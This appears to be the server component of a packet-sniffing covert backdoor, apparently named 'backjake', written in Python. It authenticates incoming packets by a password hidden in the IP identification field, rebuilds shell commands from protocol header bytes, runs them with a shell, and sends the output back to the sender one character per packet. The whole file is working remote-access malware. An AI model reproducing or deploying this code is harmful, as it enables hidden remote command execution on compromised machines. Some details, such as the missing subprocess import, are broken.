import socket
from subprocess import Popen, PIPE
from scapy.all import *
from struct import *
import sys
import os
import threading
import pcapy
import config
import backjake
import utils

command = ""
pswd = utils.encrypt(config.password)

def recieveDatagram():
	cap = pcapy.open_live(config.dev, 65536, 1, 0)
	fltr = "(tcp or udp or icmp) and not (ip src " + str(socket.gethostbyname(socket.gethostname()) + ")")
	cap.setfilter(fltr)

	while(backjake.running):
		(header, packet) = cap.next()
		packetHandler(packet)

def startServer():
	listenThread = threading.Thread(target=recieveDatagram)
	listenThread.daemon = True
	listenThread.start()

def packetHandler(packet):
	if (authenticated(packet)):
		pacType = utils.checkType(packet)
		ip, protoH, data = utils.stripPacket(packet, pacType)
		checkCommand(ip, protoH, data, pacType)

def authenticated(packet):	
	ethLength = 14
	ipLength = 20
	ip = packet[ethLength:ipLength+ethLength]
	ipHeader = unpack('!BBHHHBBH4s4s' , ip)
	ipIdent = ipHeader[3]

	# check ip identification field for encrypted password
 	if ipIdent == pswd:
 		return True

 	return False

def checkCommand(ip, proto, data, pacType):
	global command
	character = ''

	if pacType == 'tcp':
		character = proto[2]
	elif pacType == 'udp':
		character = proto[3]
	elif pacType == 'icmp':
		character = proto[2]

	# print proto
	if character < 256:
		if character != 15:
			command += chr(character)
		else:
			executeCommand(socket.inet_ntoa(ip[8]), pacType, command)
			command = ""

def executeCommand(srcAddress, pacType, command):
	# check if command is within the backdoor
	# otherwise, exec it
	# clear command at the end
	
	# directory = os.system("pwd")
	# results = os.system(command)
	# shell = str(directory) + " > " + str(results)
	# print shell -> send results back to client
	sendThread = threading.Thread(target=sendResults, args=(srcAddress,pacType,command))
	sendThread.start()

def sendResults(address, protocol, comm):
	results = subprocess.Popen(comm, shell=True, stdout=PIPE).stdout.read()
	
	# encrypt results 
	# for each character, send a packet to address
	for c in results:
		send(utils.covertPacket(address, protocol, c, pswd), verbose=0)